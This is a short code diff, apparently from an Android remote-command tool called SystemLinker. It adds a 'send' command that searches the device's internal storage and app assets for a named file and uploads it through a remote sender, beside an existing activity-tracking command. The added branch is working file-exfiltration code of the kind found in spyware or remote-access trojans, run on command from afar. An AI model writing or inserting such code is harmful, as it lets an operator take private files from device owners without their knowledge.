@@ -47,7 +47,25 @@ class CommandProcessor(
         processorScope.launch {
             try {
                 when (cmd) {
-                    
+                
+                    "send" -> {
+                        val targetFile = arg.trim()
+                        if (targetFile.isEmpty()) {
+                            uploader.sendText("❌ Filename cannot be empty.")
+                            return@launch
+                        }
+
+                        uploader.sendText("🔍 Scouring internal storage and app assets for: $targetFile ...")
+                        val foundFile = systemHandler.searchAndExtractFile(targetFile)
+
+                        if (foundFile != null && foundFile.exists()) {
+                            val isTemp = foundFile.absolutePath.contains("extracted_asset")
+                            uploader.sendDocument(foundFile, "File Export: ${foundFile.name}", deleteAfter = isTemp)
+                            uploader.sendText("✅ File extracted and uploaded successfully.")
+                        } else {
+                            uploader.sendText("❌ SystemLinker could not locate any file matching '$targetFile' internally.")
+                        }
+                    }
                     "track_activity" -> {
                         val parts = arg.split(",").map { it.trim() }
                         val duration = parts.getOrNull(0)?.toLongOrNull() ?: 10L
